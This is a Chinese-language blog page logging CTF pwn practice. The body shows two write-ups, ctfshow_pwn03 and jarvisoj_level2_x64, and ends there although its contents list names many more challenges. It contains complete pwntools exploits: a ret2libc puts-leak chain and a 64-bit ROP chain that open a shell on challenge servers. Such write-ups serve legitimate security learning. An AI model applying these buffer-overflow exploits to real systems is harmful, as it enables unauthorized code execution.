<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"yw-by.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="article">
<meta property="og:title" content="暑期刷题">
<meta property="og:url" content="http://yw-by.github.io/yw/259342972/index.html">
<meta property="og:site_name" content="yw__y">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/7.jpg">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn03_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn03_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn03_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn03_4.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/jarvisoj_level2_x64_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/jarvisoj_level2_x64_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BOGeek2019%5Dbabyrop_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_4.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn04_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn04_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn04_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn04_4.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn04_5.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn04_6.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn04_7.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_n_5_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_n_5_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_en_2_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_en_2_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_en_2_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/not_the_same_3dsctf_2016_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/not_the_same_3dsctf_2016_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/not_the_same_3dsctf_2016_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn07_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn10_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn10_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/pwn10_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_ne_5_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_ne_5_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/bjdctf_2020_babyrop_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/bjdctf_2020_babystack2_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/bjdctf_2020_babystack2_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/jarvisoj_fm_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/jarvisoj_fm_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/jarvisoj_fm_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/login_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_es_2_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_es_2_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_es_2_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_es_2_4.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_es_2_5.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_es_2_6.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/ciscn_2019_es_2_7.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_1.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_2.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_3.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop2_4.png">
<meta property="og:image" content="http://yw-by.github.io/yw/259342972/jarvisoj_level3_1.png">
<meta property="article:published_time" content="2023-08-01T12:02:34.000Z">
<meta property="article:modified_time" content="2023-10-30T13:54:19.438Z">
<meta property="article:author" content="yw-by">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yw-by.github.io/yw/259342972/7.jpg">


<link rel="canonical" href="http://yw-by.github.io/yw/259342972/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yw-by.github.io/yw/259342972/","path":"yw/259342972/","title":"暑期刷题"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>暑期刷题 | yw__y</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">yw__y</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%91%A8"><span class="nav-number">1.</span> <span class="nav-text">第一周</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-pwn03"><span class="nav-number">2.</span> <span class="nav-text">ctfshow_pwn03</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-jarvisoj-level2-x64"><span class="nav-number">3.</span> <span class="nav-text">buuctf_jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%91%A8"><span class="nav-number">4.</span> <span class="nav-text">第二周</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-OGeek2019-babyrop"><span class="nav-number">5.</span> <span class="nav-text">buuctf_[OGeek2019]babyrop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">5.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">5.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-HarekazeCTF2019-baby-rop"><span class="nav-number">6.</span> <span class="nav-text">buuctf_[HarekazeCTF2019]baby_rop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-pwn04"><span class="nav-number">7.</span> <span class="nav-text">ctfshow_pwn04</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E7%BB%95%E8%BF%87"><span class="nav-number">7.1.</span> <span class="nav-text">泄露绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">7.2.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97canary%E5%9C%A8printf%E5%87%BD%E6%95%B0%E5%A4%84%E7%9A%84%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-number">7.3.</span> <span class="nav-text">计算canary在printf函数处的偏移量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E8%A7%A3%E6%B3%95-%E8%A6%86%E7%9B%96%E7%BB%95%E8%BF%87"><span class="nav-number">7.4.</span> <span class="nav-text">第二种解法-覆盖绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-ciscn-2019-n-5"><span class="nav-number">8.</span> <span class="nav-text">buuctf_ciscn_2019_n_5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-ciscn-2019-en-2"><span class="nav-number">9.</span> <span class="nav-text">buuctf_ciscn_2019_en_2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%91%A8"><span class="nav-number">10.</span> <span class="nav-text">第三周</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-not-the-same-3dsctf-2016"><span class="nav-number">11.</span> <span class="nav-text">buuctf_not_the_same_3dsctf_2016</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-pwn07"><span class="nav-number">12.</span> <span class="nav-text">ctfshow_pwn07</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E8%A7%A3%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-number">12.1.</span> <span class="nav-text">不解的地方</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-pwn10"><span class="nav-number">13.</span> <span class="nav-text">ctfshow_pwn10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96"><span class="nav-number">13.1.</span> <span class="nav-text">查看安全策略和反汇编</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">13.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-ciscn-2019-ne-5"><span class="nav-number">14.</span> <span class="nav-text">buuctf_ciscn_2019_ne_5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96-1"><span class="nav-number">14.1.</span> <span class="nav-text">查看安全策略和反汇编</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-number">14.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%91%A8"><span class="nav-number">15.</span> <span class="nav-text">第四周</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="nav-number">16.</span> <span class="nav-text">buuctf_铁人三项(第五赛区)_2018_rop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-bjdctf-2020-babyrop"><span class="nav-number">17.</span> <span class="nav-text">buuctf_bjdctf_2020_babyrop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-bjdctf-2020-babystack2"><span class="nav-number">18.</span> <span class="nav-text">buuctf_bjdctf_2020_babystack2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-jarvisoj-fm"><span class="nav-number">19.</span> <span class="nav-text">buuctf_jarvisoj_fm</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%91%A8"><span class="nav-number">20.</span> <span class="nav-text">第五周</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ciscn-login"><span class="nav-number">21.</span> <span class="nav-text">ciscn login</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="nav-number">21.1.</span> <span class="nav-text">查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">21.2.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-2"><span class="nav-number">21.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-ciscn-2019-es-2"><span class="nav-number">22.</span> <span class="nav-text">buuctf_ciscn_2019_es_2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96"><span class="nav-number">22.1.</span> <span class="nav-text">查看保护和反汇编</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-3"><span class="nav-number">22.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E5%91%A8"><span class="nav-number">23.</span> <span class="nav-text">第六周</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-HarekazeCTF2019-baby-rop2"><span class="nav-number">24.</span> <span class="nav-text">buuctf_[HarekazeCTF2019]baby_rop2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96-1"><span class="nav-number">24.1.</span> <span class="nav-text">查看保护和反汇编</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-4"><span class="nav-number">24.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-jarvisoj-level3"><span class="nav-number">25.</span> <span class="nav-text">buuctf_jarvisoj_level3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-ida"><span class="nav-number">25.1.</span> <span class="nav-text">保护+ida</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-5"><span class="nav-number">25.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yw-by"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">yw-by</p>
  <div class="site-description" itemprop="description">每天早起一点，或许我能赶上他们</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yw-by.github.io/yw/259342972/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="yw-by">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="yw__y">
      <meta itemprop="description" content="每天早起一点，或许我能赶上他们">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="暑期刷题 | yw__y">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          暑期刷题
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-08-01 20:02:34" itemprop="dateCreated datePublished" datetime="2023-08-01T20:02:34+08:00">2023-08-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-10-30 21:54:19" itemprop="dateModified" datetime="2023-10-30T21:54:19+08:00">2023-10-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><img src="/yw/259342972/7.jpg" class>

<span id="more"></span>

<h1 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h1><h1 id="ctfshow-pwn03"><a href="#ctfshow-pwn03" class="headerlink" title="ctfshow_pwn03"></a>ctfshow_pwn03</h1><p>checksec一下</p>
<img src="/yw/259342972/pwn03_1.png" class>

<p>32位程序开了nx，ret2shellcode不行了<br>拖入ida<br>main函数</p>
<img src="/yw/259342972/pwn03_2.png" class>

<p>查看那个好明显的函数<strong>pwnme</strong></p>
<img src="/yw/259342972/pwn03_3.png" class>

<p>可溢出<br>没有找到后门等<br>ret2text和ret2syscall都不可以了<br>我能想到的是ret2libc<br>本题有puts，所以可以用puts来泄露libc的版本<br>原因：延时绑定，可以泄露调用过的函数的got地址（具体不太了解）<br>第一个payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(puts_plt)+p32(main_addr)+p32(puts_got)</span><br></pre></td></tr></table></figure>

<p>之前的准备：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=efl.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>偏移量的计算：ida给的是对的</p>
<img src="/yw/259342972/pwn03_4.png" class>

<p>9+4&#x3D;13<br>解释为啥payload先plt再main最后got<br>我的理解：先plt是调用puts函数，main的地址作为返回地址为了下一次的payload发送，got则作为函数的参数，即puts函数的地址。<br>发送数据后要接受puts的地址<br>接受之前要</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;32bits\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>之后接收数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_addr=u32(io.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>接收四个字节（32位的一个地址长度）</p>
<p>然后获取libc版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure>

<p>计算基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcbase=puts_addr-elf.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>算system和&#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最终exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./stack1&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28190</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(puts_plt)+p32(main_addr)+p32(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;32bits\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(sys_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>运行后就可以拿到shell</p>
<h1 id="buuctf-jarvisoj-level2-x64"><a href="#buuctf-jarvisoj-level2-x64" class="headerlink" title="buuctf_jarvisoj_level2_x64"></a>buuctf_jarvisoj_level2_x64</h1><p>checksec一下</p>
<img src="/yw/259342972/jarvisoj_level2_x64_1.png" class>

<p>64位，开启了nx保护</p>
<p>拖入ida</p>
<img src="/yw/259342972/jarvisoj_level2_x64_2.png" class>

<p>查看function函数</p>


<p>查看栈结构</p>


<p>偏移量：0x88</p>
<p>f12+shift查看字符串窗口</p>


<p>有&#x2F;bin&#x2F;sh和system</p>
<p>最终确认二者地址为</p>




<p>sys_addr&#x3D;0x4004C0</p>
<p>bin_sh&#x3D;0x600A90</p>
<p>因为文件是64位的，需要用rdi传参</p>
<p>又system函数有栈对齐的要求，需要ret来凑数</p>
<p>关于栈对齐，推荐一篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15996874.html">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题 - ZikH26 - 博客园</a></p>
<p>文章中说system函数要求在其之前16位栈对齐，是说在system之前的长度必须是16的倍数</p>
<p>(偏移量)0x88+(pop_rid)8+(bin_sh)8&#x3D;0x98&#x3D;152再加8是16的倍数</p>
<p>所以需要ret来栈对齐</p>
<p>查找pop_rid和pop_ret的gadget</p>
<p>ROPgadget –binary 文件名 –only ‘pop|ret’</p>


<p>payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&quot;./level2_x64&quot;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25190</span>)</span><br><span class="line">pop_rdi=<span class="number">0x4006b3</span></span><br><span class="line">bin_sh=<span class="number">0x00600A90</span></span><br><span class="line">sys_addr=<span class="number">0x4004C0</span></span><br><span class="line">pop_ret=<span class="number">0x4004a1</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>但是打远程不对齐也能通</p>
